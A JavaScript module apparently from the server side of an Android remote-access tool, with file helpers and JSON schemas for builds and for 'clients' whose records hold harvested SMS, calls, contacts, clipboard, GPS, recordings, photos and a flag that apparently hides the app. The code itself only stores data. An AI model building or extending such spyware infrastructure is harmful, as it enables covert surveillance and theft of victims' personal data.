// Async Database Operations Module

import fs from 'fs/promises';
import fss from 'fs';
import path from 'path';
import { ensureDir } from '../utils/ensureDir.js';
import { decompilePath, getBuiltApkPath } from '../builder/path.js';
import { dbPath, downloadsPath, photosPath, recordingsPath, clientsDir, backupsDir } from './path.js';

const asyncFs = {
    async readJSON(filepath) {
        try {
            const data = await fs.readFile(filepath, 'utf8');
            return JSON.parse(data);
        } catch (e) {
            if (e.code === 'ENOENT') return null;
            throw e;
        }
    },

    async writeJSON(filepath, data, pretty = false) {
        const content = pretty ? JSON.stringify(data, null, 2) : JSON.stringify(data);
        await fs.writeFile(filepath, content, 'utf8');
    },

    async exists(filepath) {
        try {
            await fs.access(filepath);
            return true;
        } catch {
            return false;
        }
    },

    async deleteIfExists(filepath) {
        try {
            await fs.unlink(filepath);
            return true;
        } catch (e) {
            if (e.code === 'ENOENT') return false;
            throw e;
        }
    },

    async listFiles(dirpath, extension = null) {
        try {
            const files = await fs.readdir(dirpath);
            if (extension) {
                return files.filter(f => f.endsWith(extension));
            }
            return files;
        } catch (e) {
            if (e.code === 'ENOENT') return [];
            throw e;
        }
    },

    async getStats(filepath) {
        try {
            return await fs.stat(filepath);
        } catch {
            return null;
        }
    },

    async ensureDir(dirpath) {
        await fs.mkdir(dirpath, { recursive: true });
    }
};

const initDirectories = async () => {
    const dirs = [
        dbPath,
        downloadsPath,
        photosPath,
        recordingsPath,
        decompilePath,
        getBuiltApkPath(),
        clientsDir(),
        backupsDir()
    ];

    for (const dir of dirs) {
        await asyncFs.ensureDir(dir);
    }
    return dirs;
};

const paths = {
    main: () => path.join(dbPath, 'main.json'),
    logs: () => path.join(dbPath, 'logs.json'),
    client: (id) => path.join(dbPath, 'clients', `${id}.json`),
    clientsDir: () => clientsDir(),
    backupsDir: () => backupsDir(),
    backup: (name) => path.join(backupsDir(), name)
};

const schemas = {
    main: () => ({
        users: [],
        sessions: [],
        clientIndex: [],
        settings: {
            serverStart: new Date().toISOString(),
            version: '2.4.0',
            maxClients: 500
        },
        build: {
            serverUrl: '',
            homePageUrl: '',
            lastBuild: null,
            buildCount: 0
        }
    }),

    client: (id) => ({
        id,
        connection: {
            ip: '',
            country: '',
            city: '',
            timezone: '',
            firstSeen: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            online: false,
            reconnectCount: 0
        },
        device: {
            model: 'Unknown',
            brand: 'Unknown',
            version: 'Unknown'
        },
        data: {
            sms: [],
            calls: [],
            contacts: [],
            wifi: [],
            clipboard: [],
            notifications: [],
            permissions: [],
            apps: [],
            gps: [],
            files: [],
            downloads: [],
            recordings: [],
            photos: []
        },
        state: {
            gpsInterval: 0,
            currentPath: '',
            fasonHidden: false,
            cameras: [],
            cameraPermission: false,
            queue: []
        },
        queue: [],
        sms: [],
        calls: [],
        contacts: [],
        wifi: [],
        clipboard: [],
        notifications: [],
        permissions: [],
        apps: [],
        gps: [],
        downloads: [],
        recordings: [],
        files: [],
        currentPath: '',
        cameras: [],
        photos: [],
        cameraPermission: false,
        deviceInfo: null,
        fasonHidden: false,
        lastUpdated: new Date().toISOString()
    }),

    logs: () => ({
        logs: [],
        stats: { total: 0, cleared: 0 }
    })
};

export { asyncFs, initDirectories, paths, schemas };
